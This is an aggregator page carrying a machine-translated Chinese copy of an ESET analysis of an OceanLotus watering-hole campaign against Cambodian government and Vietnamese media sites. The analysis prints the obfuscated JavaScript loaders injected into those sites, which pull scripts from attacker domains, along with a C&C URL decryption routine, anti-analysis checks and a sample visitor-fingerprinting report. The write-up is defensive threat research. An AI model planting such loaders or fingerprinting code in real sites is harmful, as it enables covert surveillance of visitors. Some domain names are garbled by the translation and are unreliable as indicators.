<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👼 🧘🏻 🐀 OceanLotus：东南亚的水坑袭击 🤭 👕 🌍</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ESET专家分析了新的水坑运动，该运动针对东南亚的多个地点。 据称，攻击者自2018年9月以来一直在行动。 这场运动的规模各不相同-我们设法发现了21种受到威胁的资源，包括柬埔寨国防部，柬埔寨外交部和国际合作部的网站以及几家越南报纸和博客。 

 
 根据分析，我们发现该运动是由OceanLotus...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>OceanLotus：东南亚的水坑袭击</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/436136/">  ESET专家分析了新的水坑运动，该运动针对东南亚的多个地点。 据称，攻击者自2018年9月以来一直在行动。 这场运动的规模各不相同-我们设法发现了21种受到威胁的资源，包括柬埔寨国防部，柬埔寨外交部和国际合作部的网站以及几家越南报纸和博客。 <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i5/w7/do/i5w7dovvrgp-jyuwqn0cgd72oy0.jpeg"></div> <br> 根据分析，我们发现该运动是由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">OceanLotus</a>组（也称为<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ART32</a>和ART-S-00）进行的。 该组织至少从<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">2012年</a>开始运作，专门从事网络间谍活动，对政府机构和持不同政见者特别感兴趣。 <br><br><a name="habracut"></a> 该活动似乎是OceanLotus水坑计划的演变，Volexity研究人员于2017年以``框架B''的名义<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">记录</a>了该框架。自去年以来，该网络集团已学会使其难以分析其恶意框架。 除其他改进外，我们注意到使用公共密钥加密来交换AES会话密钥。 该方法用于加密不允许安全产品拦截最终有效负载的数据交换。 此外，攻击者从HTTP切换到WebSocket来隐藏恶意数据交换。 <br><br>  ESET专家发现的每个受感染站点都将访问者重定向到由OceanLotus控制的单独域。 <br><br> 下图显示了广告系列的目标区域。 <br><br><img src="https://habrastorage.org/webt/ek/wr/ov/ekwrovbvngwngd-noo6vevjqfqo.png"><br>  <i>图1.受感染站点的地理位置</i> <br><br> 受侵害最多的领域是新闻媒体或与柬埔寨政府有关的领域。 以下是受害者名单。 我们警告他们有关在10月进行破坏的行为，但在2018年底，某些网站上仍然存在恶意脚本： <br><br>  -baotgm [。]网-越南媒体（总部位于德克萨斯州阿灵顿） <br>  -cnrp7 [。] Org-柬埔寨国家救助党网站 <br>  -conggiaovietnam [。]净-越南的宗教内容 <br>  -daichungvienvinhthanh [。] Com-越南语中的宗教内容 <br>  -danchimviet [。]信息-越南媒体 <br>  -danviet [。] Vn-越南媒体 <br>  -danviethouston [。] Com-越南媒体 <br>  -fvpoc [。] Org-越南公共组织 <br>  -gardencityclub [。] Com-柬埔寨金边的高尔夫俱乐部 <br>  -lienketqnhn [。] Org-越南媒体 <br>  -mfaic.gov [。] Kh-柬埔寨外交和国际合作部 <br>  -mod.gov [。] Kh-柬埔寨国防部 <br>  -mtgvinh [。]净-越南的宗教内容 <br>  -nguoitieudung.com [。] Vn-越南媒体 <br>  -phnompenhpost [。] Com-柬埔寨英语媒体 <br>  -raovatcalitoday [。] Com-越南文网站 <br>  -thongtinchongphandong [。] Com-越南反对派媒体 <br>  -tinkhongle [。] Com-越南媒体 <br>  -toithichdoc.blogspot [。] Com-越南博客 <br>  -trieudaiviet [。] Com-越南文网站 <br>  -triviet [。]新闻-越南媒体 <br><br> 在水坑攻击中，攻击者通常会破坏潜在受害者经常访问的站点。 但是，在此活动中，OceanLotus小组损害了几个受欢迎的站点。 以下是受感染网站及其<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Alexa评分</a>的列表：全球以及该网站最受欢迎的国家/地区。 例如，Dan Viet报纸（danviet [。] Vn）的网站在2018年底在越南的出席人数排在第116位。 <br><br>  -丹麦[。] Vn-12 887/116 <br>  -金边[。] Com-85910/18 880 <br>  -nguoitieudung.com [。] Vn-261 801/2 397 <br>  -danchimviet [。]信息-287852/144 884 <br>  -baotgm [。]净-675669/119 737 <br>  -toithichdoc.blogspot [。] Com-700 470/11532 <br>  -mfaic.gov [。]时-978 165/2 149 <br>  -conggiaovietnam [。]净-1,040 548/15 368 <br>  -thongtinchongphandong [。] Com-1 134 691/21 575 <br>  -tinkhongle [。] Com-1301722/15 224 <br>  -daichungvienvinhthanh [。] Com-1,778,418 / 23,428 <br>  -mod.gov [。]每小时-4,247,649 / 3,719 <br><br><h3> 分析方法 </h3><br> 对于所有受感染的站点，都使用了类似的方法。 攻击者在主页或发布在同一服务器上的JavaScript文件中添加了一小段JavaScript代码。 稍微混淆的代码片段（请参见下文）从攻击者控制的服务器加载另一个脚本。 以下是添加到<code>https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</code>的JavaScript代码段，该代码段可从<code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code>下载文件<code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> 。 <br><br><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt = <span class="hljs-string"><span class="hljs-string">"http"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); l.src = pt + <span class="hljs-string"><span class="hljs-string">"s://"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">2</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">3</span></span>] + <span class="hljs-string"><span class="hljs-string">'ip.'</span></span> + <span class="hljs-string"><span class="hljs-string">'info/images/cdn.js?from=maxcdn'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'body'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].appendChild(l) })(<span class="hljs-string"><span class="hljs-string">'web'</span></span>, <span class="hljs-string"><span class="hljs-string">'a'</span></span>, <span class="hljs-string"><span class="hljs-string">'link'</span></span>, <span class="hljs-string"><span class="hljs-string">'.self'</span></span>);</code> </pre> <br> 为了避免被发现，攻击者采取了以下措施： <br><br>  -它们混淆了脚本，以防止分配静态最终URL <br>  -该网址看起来像该网站使用的真实JavaScript库 <br>  -对于每个受感染的站点，使用单独的域和URI。 <br>  -所有遭到入侵的网站都有不同的脚本。 以下是在一个受感染站点中正在实施的脚本： <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-string"><span class="hljs-string">'crash-course'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = <span class="hljs-string"><span class="hljs-string">"fzgbc knowsztall znfo"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _ = <span class="hljs-string"><span class="hljs-string">'/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-string"><span class="hljs-string">"VisitorIdentification.js?sa="</span></span> + i; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; script.src = <span class="hljs-string"><span class="hljs-string">"htt"</span></span> + <span class="hljs-string"><span class="hljs-string">"ps:"</span></span> + _ + _ + s.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>).map(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="hljs-function"> =&gt;</span></span> x.replace(<span class="hljs-string"><span class="hljs-string">"z"</span></span>, <span class="hljs-string"><span class="hljs-string">"i"</span></span>)).join(<span class="hljs-string"><span class="hljs-string">"."</span></span>) + _ + e; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> doc = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'script'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]; doc.parentNode.insertBefore(script, doc);</code> </pre> <br><h3> 第一阶段 </h3><br> 根据访问者IP地址的位置，第一阶段的服务器（例如， <code>weblink.selfip[.]info</code> <code>mfaic.gov[.]kh</code> ）传输错误的脚本（随机合法的JavaScript库）或第一阶段的脚本（例如，SHA- 1：2194271C7991D60AE82436129D7F25C0A689050A）。 并非所有服务器都会检查位置，如果是，则只有越南和柬埔寨的访客会收到恶意脚本。 <br><br> 如下所示，第一阶段脚本具有多项检查以防止检测。 <br><br><pre> <code class="javascript hljs">[…] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">t</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; !<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(t <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> n)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TypeError</span></span>(<span class="hljs-string"><span class="hljs-string">'Cannot call a class as a function'</span></span>); }(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, t), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.t = { <span class="hljs-attr"><span class="hljs-attr">o</span></span>: <span class="hljs-literal"><span class="hljs-literal">null</span></span>, <span class="hljs-attr"><span class="hljs-attr">s</span></span>: !<span class="hljs-number"><span class="hljs-number">0</span></span> }, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.scr = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.r(), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.i = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">'scroll'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ri || r.scr &amp;&amp; !rts &amp;&amp; (r.scr = !<span class="hljs-number"><span class="hljs-number">1</span></span>, rc(n)), ri = !<span class="hljs-number"><span class="hljs-number">1</span></span>; }); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t.prototype.r = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerWidth - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerWidth &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, r = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerHeight - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerHeight &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, e = n ? <span class="hljs-string"><span class="hljs-string">'vertical'</span></span> : <span class="hljs-string"><span class="hljs-string">'horizontal'</span></span>; r &amp;&amp; n || !(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome.isInitialized || n || r) ? (tts = !<span class="hljs-number"><span class="hljs-number">1</span></span>, tto = <span class="hljs-literal"><span class="hljs-literal">null</span></span>) : (tts = !<span class="hljs-number"><span class="hljs-number">0</span></span>, tto = e); }, <span class="hljs-number"><span class="hljs-number">500</span></span>); } […]</code> </pre> <br> 该脚本将等待，直到受害者滚动到页面为止。 它还检查窗口分辨率以及是否启用了Firebug（基于浏览器的用于分析网页的插件）。 如果至少一项检查失败，则执行终止。 <br><br> 然后，他使用自定义算法解密C＆C命令服务器的域。 例如，3B37371M1B1B382R332V1A382W36392W2T362T1A322T38代表<code>wss://tcog.thruhere[.]net</code> 。 对于第一阶段的每个域，攻击者还注册了第二阶段的域，并且它们都位于不同的服务器上。 下面的代码等效于用Python编写的解密函数。 <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(encrypted_url)</span></span></span><span class="hljs-function">:</span></span> s = <span class="hljs-string"><span class="hljs-string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>.join(chr(s.index(encrypted_url[e]) * <span class="hljs-number"><span class="hljs-number">36</span></span> + s.index(encrypted_url[e+<span class="hljs-number"><span class="hljs-number">1</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,len(encrypted_url),<span class="hljs-number"><span class="hljs-number">2</span></span>))</code> </pre> <br> 解密C＆C地址后，该脚本将发送一个唯一的15位字符串，然后接收并运行第二阶段脚本。 数据交换通过WebSocket或SSL进行。 该协议在客户端和服务器之间同时提供双向通信。 这意味着在客户端建立连接之后，即使没有请求，服务器也可以将数据发送到客户端。 但是，在特定情况下，该协议主要用于避免检测。 <br><br><h3> 第二阶段 </h3><br> 第二阶段脚本用于侦察。  OceanLotus开发人员使用了<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GitHub上</a>提供的Valve的Fingerprintjs2库，并做了一些微小的更改-添加了网络共享并创建了一个特殊的报告。 <br><br> 下图显示了脚本执行的各种操作。 通过第一步开始的WebSocket会话进行通信。 <br><br><img src="https://habrastorage.org/webt/p7/s1/ip/p7s1ipl0ax28vo16mj2je2a59kc.png"><br>  <i>图2.有效负载第二阶段的方案</i> <br><br> 使用服务器生成的AES会话密钥对通信进行加密。 它使用1024位RSA公钥加密并发送到客户端，因此无法解密客户端和服务器之间的数据交换。 <br><br> 与以前版本的OceanLotus水坑框架相比，保护自己免受此损害更加困难，因为无法检测和解密通过网络传输的数据。 这样可以防止网络发现数据。 服务器传输的公钥不会更改，并在IoC部分列出。 <br><br> 侦查脚本创建与以下报告类似的报告，并将其发送到第二阶段C＆C服务器。 <br><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"history"</span></span>: { <span class="hljs-string"><span class="hljs-string">"client_title"</span></span>: <span class="hljs-string"><span class="hljs-string">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_cookie"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_hash"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_referrer"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/foreign-ngos"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_platform_ua"</span></span>: <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_time"</span></span>: <span class="hljs-string"><span class="hljs-string">"2018-10-21T12:43:25.254Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"timezone"</span></span>: <span class="hljs-string"><span class="hljs-string">"Asia/Bangkok"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_network_ip_list"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"192.168.xx"</span></span>, <span class="hljs-string"><span class="hljs-string">"xxxx"</span></span> ], <span class="hljs-string"><span class="hljs-string">"client_api"</span></span>: <span class="hljs-string"><span class="hljs-string">"wss://tcog.thruhere.net/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_zuuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_uuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"a612cdb028e1571dcab18e4aa316da26"</span></span> }, <span class="hljs-string"><span class="hljs-string">"navigator"</span></span>: { <span class="hljs-string"><span class="hljs-string">"plugins"</span></span>: { <span class="hljs-string"><span class="hljs-string">"activex"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"cors"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"flash"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"java"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"foxit"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"phonegap"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"quicktime"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"realplayer"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"silverlight"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"touch"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vbscript"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vlc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"webrtc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"wmp"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span> }, <span class="hljs-string"><span class="hljs-string">"_screen"</span></span>: { <span class="hljs-string"><span class="hljs-string">"width"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"height"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"availWidth"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"availHeight"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"resolution"</span></span>: <span class="hljs-string"><span class="hljs-string">"1920x1080"</span></span> }, <span class="hljs-string"><span class="hljs-string">"_plugins"</span></span>: [ [...]</code> </pre> <br> 该报告与由Volexity在2017年记录的<a href="">OceanLotus Framework B</a>生成的其他报告几乎相同。 它们的部分相似且包含相同的错字。 由于目标的相似性和位置，我们可以高度肯定地说是由OceanLotus进行了该活动。 <br><br> 生成的报告包含有关受害者的浏览器和访问过的网站的详细信息：用户代理，HTTP引用请求标头，本地和外部IP地址，插件以及浏览器语言设置设置。 <br><br> 此外，每台机器都有两个唯一的标识符： <i>client_zuuid</i>和<i>client_uuid</i> 。 他们可以用来识别用户并跟踪他们的访问。 这些标识符实际上存在于框架的2017版本中，并且<i>client_uuid</i>以类似的方式计算。 <br><br>  client_zuuid的值是navigator.mediaDevices.enumerateDevices中包含的各种deviceId值的串联。 设备是浏览器可以访问的外部设备，例如相机和麦克风。 因此，在同一台计算机的不同访问期间，一个用户的值必须匹配。 <br><br>  <i>client_uuid</i>值是Fingerprintjs2分配的指纹的MD5哈希值。 收集的数据包括浏览器用户代理，语言，时区，浏览器插件和浏览器可访问的字体。 再说一次-对于所有访问，该值都应该相同，例如，仅当用户未更新浏览器或未从其他设备登录时。 <br><br> 最后，服务器可以将其他JavaScript代码发送到受害者的计算机，也许这是交付的组件。 不幸的是，由于使用AES会话密钥来解密数据交换，我们无法确定入侵者在野外样本中提供了哪个组件。 另外，有效载荷仅传递给某些受害者。 因此，使用测试机，我们无法获得它们。 但是，根据以前的报告，OceanLotus的水坑运动主要针对网络钓鱼。 例如，Volexity在一份报告中<a href="">写道</a> ，用户看到一个弹出窗口，要求他们通过开放的OAuth协议授权访问受害人的OceanLotus Google App的Google帐户。 使用此技术，攻击者可以获取受害者的联系人和电子邮件。 <br><br><h3> 网络基础设施 </h3><br> 为了最大程度地进行隐蔽工作，OceanLotus运营商为每个受感染站点的第一阶段和第二阶段注册了一个域。 每个域都托管在具有自己IP地址的单独服务器上。 此活动至少注册了50个域和50台服务器。 <br><br> 大部分第一阶段域名都是在具有免费域名的服务上注册的，第二阶段域名主要是付费的。 除其他外，他们的名字被伪装成合法的。 以下是攻击者试图复制的服务列表，分别为C＆C和合法域： <br><br>  -cdn-ampproject [。] Com / cdn.ampproject.com <br>  -bootstraplink [。] Com / getbootstrap.com <br>  -sskimresources [。] Com / s.skimresources.com <br>  -widgets-wp [。] Com / widgets.wp.com <br><br> 使用域的数量及其与合法站点的相似性可能会使查看网络流量的人员使检测变得复杂。 <br><br><h3> 结论 </h3><br> 尽管安全研究人员给予了关注，但OceanLotus仍继续成功地攻击东南亚的目标。 此外，该小组还通过在其军械库中包括用于水坑攻击的框架（一种适用于Windows和macOS的恶意软件）来改进工具。 本报告中讨论的最新框架更新表明，攻击者的技能得到了提高。 <br><br> 为了限制可能的受害者数量，我们通知了受感染网站的所有者，并说明了如何删除恶意JavaScript代码。 但是，其中一些人并不愿意接受信息和援助。 <br><br>  ESET研究人员将继续监视OceanLotus集团的发展。 妥协指标可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GitHub</a>上<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">找到</a> 。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN436136/">https://habr.com/ru/post/zh-CN436136/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN436126/index.html">Kubernetes：在集群中构建Docker映像</a></li>
<li><a href="../zh-CN436128/index.html">采访包袋猎人Artyom Moscow。 他入侵了Steam，并获得了Valve历史上最大的奖项。</a></li>
<li><a href="../zh-CN436130/index.html">电信和大众传播部通过俄罗斯站传输互联网流量的项目使OneWeb在俄罗斯的合法化变得复杂</a></li>
<li><a href="../zh-CN436132/index.html">安装npm软件包后可能发生的12种奇怪的事情</a></li>
<li><a href="../zh-CN436134/index.html">进口路由器将征收高达20％的弹幕税</a></li>
<li><a href="../zh-CN436140/index.html">华为存储的“内幕”：专有技术以及其他不具备的技术</a></li>
<li><a href="../zh-CN436144/index.html">在生物大流行的背景下吸血的上司：为什么一个自治的团队如果没有集中化就会解散</a></li>
<li><a href="../zh-CN436148/index.html">一个大三的故事-如何开始工作而不害怕一切</a></li>
<li><a href="../zh-CN436150/index.html">配置设备数据到AWS IoT Core的传输</a></li>
<li><a href="../zh-CN436152/index.html">教会我面向业务设计的错误</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>